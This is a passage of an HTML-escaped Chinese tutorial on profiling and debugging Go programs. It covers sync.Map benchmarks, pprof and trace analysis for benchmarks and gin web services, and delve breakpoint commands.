*testing.PB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; pb.Next() {&lt;br/&gt;demoMap.Store(&lt;span&gt;&quot;a&quot;&lt;/span&gt;, &lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; i := &lt;span&gt;0&lt;/span&gt;; i &amp;lt; &lt;span&gt;1000&lt;/span&gt;; i++ {&lt;br/&gt;demoMap.Load(&lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// go test -benchmem -run=^$ -bench . demo -v -count=1 -cpuprofile=cpu.profile -memprofile=mem.profile -benchtime=10s&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// goos: darwin&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// goarch: amd64&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// pkg: demo&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkSyncMap&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkSyncMap-4     668082     15818 ns/op      16 B/op       1 allocs/op&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkConcurrentMap&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// BenchmarkConcurrentMap-4         171730     67888 ns/op       0 B/op       0 allocs/op&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// PASS&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// coverage: 0.0% of statements&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// ok  demo23.823s&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 data-line=&quot;1433&quot;&gt;&lt;span&gt;9. 性能分析&lt;/span&gt;&lt;/h2&gt;&lt;blockquote data-line=&quot;1435&quot;&gt;&lt;p data-line=&quot;1435&quot;&gt;&lt;span&gt;作用：CPU分析、内存分析。通过可视化调用链路、可视化火焰图、TOP函数等快速定位代码问题、提升代码性能。&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;1441&quot;&gt;&lt;span&gt;使用：&lt;/span&gt;&lt;/p&gt;&lt;h2 data-line=&quot;1443&quot;&gt;&lt;span&gt;9.1 pprof的使用&lt;/span&gt;&lt;/h2&gt;&lt;h3 data-line=&quot;1445&quot;&gt;&lt;span&gt;9.1.1 基准测试场景&lt;/span&gt;&lt;/h3&gt;&lt;ol class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;首先编写基准测试用例，复用上面&lt;/span&gt;&lt;code&gt;&lt;span&gt;sync.Map&lt;/span&gt;&lt;/code&gt;&lt;span&gt;的用例：&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;pre&gt;&lt;code data-line=&quot;1449&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;sync&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&quot;testing&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 压力测试sync.Map&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;BenchmarkSyncMap&lt;/span&gt;&lt;span&gt;(b *testing.B)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;demoMap := &amp;amp;sync.Map{}&lt;br/&gt;b.RunParallel(&lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(pb *testing.PB)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; pb.Next() {&lt;br/&gt;demoMap.Store(&lt;span&gt;&quot;a&quot;&lt;/span&gt;, &lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;&lt;span&gt;for&lt;/span&gt; i := &lt;span&gt;0&lt;/span&gt;; i &amp;lt; &lt;span&gt;1000&lt;/span&gt;; i++ {&lt;br/&gt;demoMap.Load(&lt;span&gt;&quot;a&quot;&lt;/span&gt;)&lt;br/&gt;}&lt;br/&gt;}&lt;br/&gt;})&lt;br/&gt;}&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&quot;2&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;执行基准测试，生成&lt;/span&gt;&lt;code&gt;&lt;span&gt;cpu.profile&lt;/span&gt;&lt;/code&gt;&lt;span&gt;文件和&lt;/span&gt;&lt;code&gt;&lt;span&gt;mem.profile &lt;/span&gt;&lt;/code&gt;&lt;span&gt;文件。命令如下&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;blockquote data-line=&quot;1473&quot;&gt;&lt;p data-line=&quot;1473&quot;&gt;&lt;span&gt;go test -benchmem -run=^&lt;span&gt;&lt;span&gt;&lt;semantics&gt;&lt;annotation encoding=&quot;application/x-tex&quot;&gt;-bench ^BenchmarkSyncMap&lt;/annotation&gt;&lt;/semantics&gt;&lt;/span&gt;&lt;span&gt;−&lt;/span&gt;benc&lt;span&gt;h&lt;span&gt;B&lt;/span&gt;&lt;/span&gt;enchma&lt;span&gt;r&lt;/span&gt;&lt;span&gt;k&lt;/span&gt;&lt;span&gt;S&lt;/span&gt;&lt;span&gt;y&lt;/span&gt;nc&lt;span&gt;M&lt;/span&gt;ap&lt;/span&gt; demo -v -count=1 -cpuprofile=cpu.profile -memprofile=mem.profile -benchtime=10s&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;1475&quot;&gt;&lt;span&gt;常用参数解释：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1477&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;-benchmem: 输出内存指标&lt;br/&gt;-run: 正则，指定需要test的方法&lt;br/&gt;-bench: 正则，指定需要benchmark的方法&lt;br/&gt;-v: 即使成功也输出打印结果和日志&lt;br/&gt;-count: 执行次数&lt;br/&gt;-cpuprofile: 输出cpu的profile文件&lt;br/&gt;-memprofile: 输出内存的profile文件&lt;br/&gt;-benchtime: 执行时间&lt;br/&gt;&lt;br/&gt;更多参数请查看：&lt;br/&gt;go help testflag&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&quot;3&quot; class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;使用&lt;/span&gt;&lt;code&gt;&lt;span&gt;go tool&lt;/span&gt;&lt;/code&gt;&lt;span&gt;自带的pprof工具分析测试结果。命令如下：&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;blockquote data-line=&quot;1493&quot;&gt;&lt;p data-line=&quot;1493&quot;&gt;&lt;span&gt;go tool pprof -http=:8000 cpu.profile&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;1495&quot;&gt;&lt;span&gt;常用参数解释：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1497&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;-http: 指定ip:port，启动web服务可视化查看分析，浏览器会自动打开页面 http://localhost:8000/ui/&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h5&gt;&lt;span&gt;可视化选项菜单:&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.7283236994219653&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMetG4fHXdCkBIA8crAbx3wA49CtWwJdrzlGJRq72icPQBe4kpVfFFUKfA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;692&quot;/&gt;&lt;/p&gt;&lt;h5&gt;&lt;span&gt;火焰图:&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.25925925925925924&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMerIbAJIJsp6pSB8N5lwmXh5Cgy038OMaRGa1Z0uXMM1viaLQmf8RASXw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h5&gt;&lt;span&gt;调用链路图:&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.6777777777777778&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeeWp9tGndhicbckzI6dicuGpLt7jxT7iajrvGux1u4uB9vtOjzxwUGBulw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h5&gt;&lt;span&gt;Top函数:&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;img data-ratio=&quot;1.3231481481481482&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeDkrucVlMQM5yPVkxhRLFLrGDLJq63AJ3p8urgd66FS0icicfZfUCPhEA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h3 data-line=&quot;1513&quot;&gt;&lt;span&gt;9.1.2 Web服务场景&lt;/span&gt;&lt;/h3&gt;&lt;p&gt;&lt;span&gt;1. 使用上面全局变量的代码示例，引入&lt;/span&gt;&lt;code&gt;&lt;span&gt;net/http/pprof&lt;/span&gt;&lt;/code&gt;&lt;span&gt;包，并单独注册各端口获取pprof数据。&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1517&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;net/http&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 引入pprof包&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// _代表只执行包内的init函数&lt;/span&gt;&lt;br/&gt;_ &lt;span&gt;&quot;net/http/pprof&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&quot;github.com/gin-gonic/gin&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 全局变量不会像PHP一样，在完成一次请求之后被销毁&lt;/span&gt;&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; GlobalVarDemo &lt;span&gt;int32&lt;/span&gt; = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 模拟接口逻辑&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;r := gin.Default()&lt;br/&gt;r.GET(&lt;span&gt;&quot;/ping&quot;&lt;/span&gt;, &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(c *gin.Context)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;GlobalVarDemo++&lt;br/&gt;c.JSON(&lt;span&gt;200&lt;/span&gt;, gin.H{&lt;br/&gt;&lt;span&gt;&quot;message&quot;&lt;/span&gt;: GlobalVarDemo,&lt;br/&gt;})&lt;br/&gt;})&lt;br/&gt;&lt;span&gt;// 再开启一个端口获取pprof数据&lt;/span&gt;&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;http.ListenAndServe(&lt;span&gt;&quot;:8888&quot;&lt;/span&gt;, &lt;span&gt;nil&lt;/span&gt;)&lt;br/&gt;}()&lt;br/&gt;&lt;span&gt;// 启动web服务&lt;/span&gt;&lt;br/&gt;r.Run()&lt;br/&gt;}&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;span&gt;2. 访问链接 &lt;/span&gt;&lt;code&gt;&lt;span&gt;http://localhost:8888/debug/pprof/&lt;/span&gt;&lt;/code&gt;&lt;span&gt;，可以看见相关profiles。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.4685185185185185&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeZKAoQzgnHibwAvjmrrDT9YW62VUliaicpQMMUVRJhsqHPxAK7nrNsUk6A/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;3. 命令使用pprof工具，获取远程服务profile，命令如下：&lt;/span&gt;&lt;/p&gt;&lt;blockquote data-line=&quot;1558&quot;&gt;&lt;p data-line=&quot;1558&quot;&gt;&lt;span&gt;go tool pprof -http=:8000 http://localhost:8888/debug/pprof/profile?seconds=5&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;pre&gt;&lt;code data-line=&quot;1560&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;备注：&lt;br/&gt;执行上面命令的时候，可以使用压测工具模拟流量，比如命令：siege -c 50 -t 100 &quot;http://localhost:8080/ping&quot;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;1565&quot;&gt;&lt;span&gt;同样，我们得到了这个熟悉的页面：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.5388888888888889&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMe09tZR4GIL1OG6JZgfictKgdW2WRibRfBO28VZxokO6tlrKJtHr3OwhXg/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h2 data-line=&quot;1571&quot;&gt;&lt;span&gt;9.2 trace工具的使用&lt;/span&gt;&lt;/h2&gt;&lt;p data-line=&quot;1573&quot;&gt;&lt;span&gt;作用：清晰查看每个逻辑处理器中Goroutine的执行过程，可以很直观看出Goroutine的阻塞消耗，包含&lt;/span&gt;&lt;span&gt;网络阻塞&lt;/span&gt;&lt;span&gt;、&lt;/span&gt;&lt;span&gt;同步阻塞(锁)&lt;/span&gt;&lt;span&gt;、&lt;/span&gt;&lt;span&gt;系统调用阻塞&lt;/span&gt;&lt;span&gt;、&lt;/span&gt;&lt;span&gt;调度等待&lt;/span&gt;&lt;span&gt;、&lt;/span&gt;&lt;span&gt;GC执行耗时&lt;/span&gt;&lt;span&gt;、&lt;/span&gt;&lt;span&gt;GC STW(Stop The World)耗时&lt;/span&gt;&lt;span&gt;。&lt;/span&gt;&lt;/p&gt;&lt;h3 data-line=&quot;1575&quot;&gt;&lt;span&gt;9.2.1 基准测试场景&lt;/span&gt;&lt;/h3&gt;&lt;p data-line=&quot;1577&quot;&gt;&lt;span&gt;使用：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1579&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;生成trace.out文件命令：&lt;/span&gt;&lt;span&gt;&lt;br/&gt;go test -benchmem -run=^$ -bench ^BenchmarkDemo_NoPool$ demo -v -count=1 -trace=trace.out &lt;br/&gt;go test -benchmem -run=^$ -bench ^BenchmarkDemo_Pool$ demo -v -count=1 -trace=trace.out &lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;span&gt;分析trace.out文件命令：&lt;/span&gt;&lt;span&gt;&lt;br/&gt;go tool trace -http=127.0.0.1:8000 trace.out&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h5&gt;&lt;span&gt;没使用sync.Pool:&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.660056657223796&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMezLTZiaW2zdnZGXRTcRRLY3QekuLY0Gq90nIKTe5xpxzORJbIz8X50gQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;706&quot;/&gt;&lt;span&gt; &lt;/span&gt;&lt;img data-ratio=&quot;0.7356608478802993&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMerSxAZZliaWg1bfhibePZibNMeD3VpN9kqouvSic722EFKQ2VRAk4U15ibibw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;802&quot;/&gt;&lt;span&gt; &lt;/span&gt;&lt;img data-ratio=&quot;0.5259259259259259&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeUMicibRO6v7hTg65SyTVyOEKm8DibkA8Uq4Lfkiaia88wpDjicYlulVke6cA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h5&gt;&lt;span&gt;使用sync.Pool:&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.562962962962963&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeCtCFHXXc4GXF9BpqYPUz7BB7llYje8pfT0dCiaRicHfWbsUasicyjL1gA/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;9.2.2 Web服务场景&lt;/span&gt;&lt;/p&gt;&lt;p data-line=&quot;1603&quot;&gt;&lt;span&gt;使用：&lt;/span&gt;&lt;/p&gt;&lt;p data-line=&quot;1605&quot;&gt;&lt;span&gt;同样引入包&lt;/span&gt;&lt;code&gt;&lt;span&gt;net/http/pprof&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1606&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;&lt;span&gt;&quot;net/http&quot;&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// 引入pprof包&lt;/span&gt;&lt;br/&gt;&lt;span&gt;// _代表只执行包内的init函数&lt;/span&gt;&lt;br/&gt;_ &lt;span&gt;&quot;net/http/pprof&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&quot;github.com/gin-gonic/gin&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 全局变量不会像PHP一样，在完成一次请求之后被销毁&lt;/span&gt;&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; GlobalVarDemo &lt;span&gt;int32&lt;/span&gt; = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 模拟接口逻辑&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;r := gin.Default()&lt;br/&gt;r.GET(&lt;span&gt;&quot;/ping&quot;&lt;/span&gt;, &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(c *gin.Context)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;GlobalVarDemo++&lt;br/&gt;c.JSON(&lt;span&gt;200&lt;/span&gt;, gin.H{&lt;br/&gt;&lt;span&gt;&quot;message&quot;&lt;/span&gt;: GlobalVarDemo,&lt;br/&gt;})&lt;br/&gt;})&lt;br/&gt;&lt;span&gt;// 再开启一个端口获取pprof数据&lt;/span&gt;&lt;br/&gt;&lt;span&gt;go&lt;/span&gt; &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;http.ListenAndServe(&lt;span&gt;&quot;:8888&quot;&lt;/span&gt;, &lt;span&gt;nil&lt;/span&gt;)&lt;br/&gt;}()&lt;br/&gt;&lt;span&gt;// 启动web服务&lt;/span&gt;&lt;br/&gt;r.Run()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;1640&quot;&gt;&lt;span&gt;启动服务后执行如下命令：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1642&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;1. &lt;br/&gt;生成trace.out文件命令：&lt;br/&gt;curl http://localhost:8888/debug/pprof/trace?seconds=20 &amp;gt; trace.out&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;和上面命令同时执行，模拟请求，也可以用ab：&lt;br/&gt;siege -c 50 -t 100 &quot;http://localhost:8080/ping&quot;&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;span&gt;2. 分析trace.out文件命令：&lt;br/&gt;go tool trace -http=127.0.0.1:8000 trace.out&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span&gt;快捷健：&lt;br/&gt;w 放大&lt;br/&gt;e 右移&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.3962962962962963&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeVDNIh1DalmLYMpTyxK3O1pIwJE9zZ2XeXuLL7cFtWnNEv58u4eL6pQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;span&gt; &lt;/span&gt;&lt;img data-ratio=&quot;0.5425925925925926&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMe53CzJstdfoYA1c3d0lusPN2kibiblf1ibfa0icDRRibnnJKiaTaHaSpNzh9g/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;span&gt; &lt;/span&gt;&lt;img data-ratio=&quot;0.5202702702702703&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeBgXO1VgyDU8XFh5mq78nOv6rY43v0o53iccmUU12LjdlAWHlRZPODGQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;888&quot;/&gt;&lt;span&gt; &lt;/span&gt;&lt;img data-ratio=&quot;0.4064814814814815&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMedSZp6Prb6omfsVPMRghFrYgWhIVVZOudtEM1oDGACZkA3re9Uld5icw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;span&gt; &lt;/span&gt;&lt;img data-ratio=&quot;0.20555555555555555&quot; data-src=&quot;https://mmbiz.qpic.cn/sz_mmbiz_png/TiccVmMZ3icdiaSdkgic80IYckBHgYPPSoMeRDkibLiamKTJgZzuibJayUiboSlQWAwystXjg64vVrzyo11MQ6TDdKUhIw/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;1080&quot;/&gt;&lt;/p&gt;&lt;h2 data-line=&quot;1666&quot;&gt;&lt;span&gt;9.3 dlv工具的使用&lt;/span&gt;&lt;/h2&gt;&lt;h3 data-line=&quot;1668&quot;&gt;&lt;span&gt;9.3.1 基准测试场景&lt;/span&gt;&lt;/h3&gt;&lt;p data-line=&quot;1670&quot;&gt;&lt;span&gt;作用：断点调试等。&lt;/span&gt;&lt;/p&gt;&lt;p data-line=&quot;1672&quot;&gt;&lt;span&gt;安装：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1674&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;go install github.com/go-delve/delve/cmd/dlv@latest&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;1678&quot;&gt;&lt;span&gt;使用：&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1681&quot;&gt;&lt;p&gt;&lt;span&gt;&lt;span&gt;package&lt;/span&gt; main&lt;br/&gt;&lt;br/&gt;&lt;span&gt;import&lt;/span&gt; (&lt;br/&gt;_ &lt;span&gt;&quot;net/http/pprof&quot;&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;&quot;github.com/gin-gonic/gin&quot;&lt;/span&gt;&lt;br/&gt;)&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 全局变量不会像PHP一样，在完成一次请求之后被销毁&lt;/span&gt;&lt;br/&gt;&lt;span&gt;var&lt;/span&gt; GlobalVarDemo &lt;span&gt;int32&lt;/span&gt; = &lt;span&gt;0&lt;/span&gt;&lt;br/&gt;&lt;br/&gt;&lt;span&gt;// 模拟接口逻辑&lt;/span&gt;&lt;br/&gt;&lt;span&gt;&lt;span&gt;func&lt;/span&gt; &lt;span&gt;main&lt;/span&gt;&lt;span&gt;()&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;r := gin.Default()&lt;br/&gt;r.GET(&lt;span&gt;&quot;/ping&quot;&lt;/span&gt;, &lt;span&gt;&lt;span&gt;func&lt;/span&gt;&lt;span&gt;(c *gin.Context)&lt;/span&gt;&lt;/span&gt; {&lt;br/&gt;GlobalVarDemo++&lt;br/&gt;c.JSON(&lt;span&gt;200&lt;/span&gt;, gin.H{&lt;br/&gt;&lt;span&gt;&quot;message&quot;&lt;/span&gt;: GlobalVarDemo,&lt;br/&gt;})&lt;br/&gt;})&lt;br/&gt;r.Run()&lt;br/&gt;}&lt;br/&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p data-line=&quot;1707&quot;&gt;&lt;span&gt;命令行执行命令:&lt;/span&gt;&lt;/p&gt;&lt;blockquote data-line=&quot;1709&quot;&gt;&lt;p data-line=&quot;1709&quot;&gt;&lt;span&gt;dlv debug main.go&lt;/span&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p data-line=&quot;1711&quot;&gt;&lt;span&gt;进入调试，常用调试命令：&lt;/span&gt;&lt;/p&gt;&lt;ul class=&quot;list-paddingleft-2&quot;&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;（list或l：输出代码）&lt;/span&gt;&lt;span&gt;：list main.go:16&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;（break或b：断点命令）&lt;/span&gt;&lt;span&gt;：执行 &lt;/span&gt;&lt;code&gt;&lt;span&gt;break main.go:16&lt;/span&gt;&lt;/code&gt;&lt;span&gt; 给行 &lt;/span&gt;&lt;code&gt;&lt;span&gt;GlobalVarDemo++&lt;/span&gt;&lt;/code&gt;&lt;span&gt;打断点&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;（continue或c：继续执行）&lt;/span&gt;&lt;span&gt;：continue&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;（print或p：打印变量）&lt;/span&gt;&lt;span&gt;：&lt;/span&gt;&lt;code&gt;&lt;span&gt;print GlobalVarDemo&lt;/span&gt;&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;span&gt;（step或s：可以进入函数）&lt;/span&gt;&lt;span&gt;：step&lt;/span&gt;&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p data-line=&quot;1719&quot;&gt;&lt;span&gt;更多命令请执行 &lt;/span&gt;&lt;code&gt;&lt;span&gt;help&lt;/span&gt;&lt;/code&gt;&lt;span&gt;。&lt;/span&gt;&lt;/p&gt;&lt;pre&gt;&lt;code data-line=&quot;1721&quot;&gt;&lt;code&gt;&lt;p&gt;&lt;span&gt;模拟请求：&lt;br/&gt;curl http://localhost:8080/ping&lt;/span&gt;&lt;/p&gt;&lt;/code&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img data-ratio=&quot;0.48055555555555557&quot; 